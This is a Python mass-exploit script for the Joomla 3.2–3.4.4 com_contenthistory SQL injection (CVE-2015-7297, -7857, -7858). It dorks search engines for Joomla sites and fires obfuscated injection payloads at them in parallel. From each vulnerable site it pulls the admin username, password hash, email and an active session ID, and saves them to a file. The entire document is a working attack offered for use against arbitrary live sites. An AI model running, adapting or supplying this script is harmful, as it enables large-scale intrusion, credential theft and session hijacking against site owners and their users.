#
# Make sure makman.py is in the same directory
# Vulnerability found by : trustwave.com
# Exploit Author : http://mukarramkhalid.com
# https://www.facebook.com/makmaniac
# https://twitter.com/themakmaniac

from  makman       import *
from  urllib.parse import urlparse
from  time         import time as timer

def banner():
    print( '\n\n' )
    print( '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' )
    print( '          [Mass Exploit] Joomla 3.2 - 3.44 SQL Injection          ' )
    print( '               Vulnerability found by : trustwave.com               ' )
    print( '          CVE-2015-7297, CVE-2015-7857, and CVE-2015-7858           ' )
    print( '    MakMan -- http://mukarramkhalid.com -- http://fb.com/makmaniac  ' )
    print( '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' )
    print( '\n' )

def inject( u ):
    tblprefix   = ''
    username    = ''
    password    = ''
    email       = ''
    session_id  = ''
    #Payload for version() and user()
    payload1    = { 'option' : 'com_contenthistory', 'view' : 'history', 'list[ordering]' : '' , 'item_id' : '', 'type_id' : '', 'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,version(),user())as mk)``)``))' }
    #Payload for table prefix
    payload2    = { 'option' : 'com_contenthistory', 'view' : 'history', 'list[ordering]' : '' , 'item_id' : '', 'type_id' : '', 'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,(/*!00000select*//*!00000table_name*//*!00000from*//*!00000information_schema*/.tables/*!00000where*/table_schema=database() and/*!00000table_name*/like 0x25636f6e74656e745f7479706573 limit 0,1))as mk)``)``))' }
    #Formating our URL properly
    o           = urlparse(u)
    url         = o.scheme + '://' + o.netloc + o.path
    try:
        r   = requests.get( url, params = payload1, timeout= 15 )
        if 'makman~:' in r.text:
            iresult = re.search( "makman~:(.+?)'", r.text ).group(1)
            r = requests.get( url, params = payload2, timeout= 15 )
            if 'makman~:' in r.text:
                tresult = re.search( "makman~:(.+?)'", r.text ).group(1)
                tblprefix = tresult.replace('content_types', '')
                payload3 = { 'option' : 'com_contenthistory', 'view' : 'history', 'list[ordering]' : '' , 'item_id' : '', 'type_id' : '', 'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,username,password,email) /*!00000from*/' + tblprefix + 'users order by id ASC limit 0,1),(/*!00000select*/session_id /*!00000from*/' + tblprefix + 'session order by time DESC limit 0,1))as mk)``)``))' }
                r = requests.get( url, params = payload3, timeout= 15 )
                if 'makman~:' in r.text:
                    fresult     = re.search( "makman~:(.+?)'", r.text ).group(1)
                    username    = fresult.split('~:')[0]
                    password    = fresult.split('~:')[1]
                    email       = fresult.split('~:')[2]
                    session_id  = fresult.split('~:')[3]
            print ( '------------------------------------------------\n'  )
            print ( '[+] Url        : '      + url                        )
            print ( '[+] User       : '      + iresult.split('~:')[1]     )
            print ( '[+] Version    : '      + iresult.split('~:')[0]     )
            print ( '[+] tbl_prefix : '      + tblprefix                  )
            print ( '[+] Username   : '      + username                   )
            print ( '[+] Password   : '      + password                   )
            print ( '[+] Email      : '      + email                      )
            print ( '[+] Session Id : '      + session_id                 )
            print ( '\n------------------------------------------------\n')
            sys.stdout.flush()
            return url + '~:' + iresult + '~:' + tblprefix + '~:' + username + '~:' + password + '~:' + email + '~:' + session_id
        else:
            return url + '~:' + 'Not Vulnerable'
    except:
        return url + '~:' + 'Bad Response'

def main():
    banner()
    start         = timer()
    dork          = 'inurl:index.php?option=com_*'
    file_string   = '######## By MakMan ########\n'
    final_result  = []
    count         = 0
    print( '[+] Starting dork scanner for : ' + dork)
    sys.stdout.flush()
    #Calling dork_scanner from makman.py for 6 pages and 6 parallel processes
    search_result = dork_scanner( dork, '6', '6' )
    print( '[+] Total URLs found : ' + str( len( search_result ) ) )
    with open( 'urls.txt', 'a', encoding = 'utf-8' ) as ufile:
        ufile.write( '\n'.join( search_result ) )
    print( '[+] URLs written to urls.txt' )
    print( '\n[+] Trying Joomla SQL Injection exploit on ' + str( len( search_result ) ) + ' urls' )
    sys.stdout.flush()
    #Running 8 parallel processes for the exploitation
    with Pool(8) as p:
        final_result.extend( p.map( inject, search_result ) )
    for i in final_result:
        if not 'Not Vulnerable' in i and not 'Bad Response' in i:
            count += 1
            file_string = file_string + i.split('~:')[0] + '\n' + i.split('~:')[1] + '\n' + i.split('~:')[2] + '\n' + i.split('~:')[3] + '\n' + i.split('~:')[4] + '\n' + i.split('~:')[5] + '\n' + i.split('~:')[6] + '\n\n\n'
    #Writing vulnerable URLs in a file makman.txt
    with open( 'makman.txt', 'a', encoding = 'utf-8' ) as rfile:
        rfile.write( file_string )
    print( 'Total URLs Scanned    : ' + str( len( search_result ) ) )
    print( 'Vulnerable URLs Found : ' + str( count ) )
    print( 'Script Execution Time : ' + str ( timer() - start ) + ' seconds' )

if __name__ == '__main__':
    main()


#End
